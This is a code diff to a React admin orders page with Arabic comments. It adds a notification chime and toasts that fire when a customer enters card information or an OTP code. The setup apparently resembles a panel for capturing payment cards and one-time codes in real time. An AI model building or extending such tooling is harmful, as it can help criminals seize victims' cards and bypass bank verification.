@@ -90,6 +90,40 @@ const AdminOrders = () => {
   const [startDate, setStartDate] = useState<Date | undefined>();
   const [endDate, setEndDate] = useState<Date | undefined>();
 
+  // دالة لتشغيل صوت إشعار مميز للطلبات الجديدة
+  const playOrderNotificationSound = () => {
+    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
+    
+    const playBeep = (frequency: number, startTime: number, duration: number) => {
+      const oscillator = audioContext.createOscillator();
+      const gainNode = audioContext.createGain();
+      
+      oscillator.connect(gainNode);
+      gainNode.connect(audioContext.destination);
+      
+      oscillator.frequency.setValueAtTime(frequency, startTime);
+      oscillator.type = 'triangle';
+      
+      gainNode.gain.setValueAtTime(0.3, startTime);
+      gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration);
+      
+      oscillator.start(startTime);
+      oscillator.stop(startTime + duration);
+    };
+    
+    // تشغيل سلسلة نغمات مميزة
+    const currentTime = audioContext.currentTime;
+    playBeep(800, currentTime, 0.15);
+    playBeep(1000, currentTime + 0.18, 0.15);
+    playBeep(1200, currentTime + 0.36, 0.2);
+    
+    // نغمة إضافية
+    setTimeout(() => {
+      const newTime = audioContext.currentTime;
+      playBeep(1000, newTime, 0.18);
+    }, 700);
+  };
+
   useEffect(() => {
     const checkAuthAndFetchOrders = async () => {
       const { data: { session } } = await supabase.auth.getSession();
@@ -115,6 +149,7 @@ const AdminOrders = () => {
           },
           (payload: any) => {
             console.log('🔔 طلب جديد!', payload.new);
+            playOrderNotificationSound();
             sonnerToast.success("طلب جديد!", {
               description: `عميل جديد: ${payload.new.owner_name || 'غير محدد'}`,
               duration: 10000
@@ -151,6 +186,11 @@ const AdminOrders = () => {
           },
           (payload: any) => {
             console.log('🔔 محاولة دفع جديدة!', payload.new);
+            playOrderNotificationSound();
+            sonnerToast.info("محاولة دفع جديدة!", {
+              description: "عميل أدخل معلومات البطاقة",
+              duration: 8000
+            });
             fetchOrders();
           }
         )
@@ -164,6 +204,11 @@ const AdminOrders = () => {
           },
           (payload: any) => {
             console.log('🔔 محاولة OTP جديدة!', payload.new);
+            playOrderNotificationSound();
+            sonnerToast.info("كود تحقق جديد!", {
+              description: "عميل أدخل كود OTP",
+              duration: 8000
+            });
             fetchOrders();
           }
         )
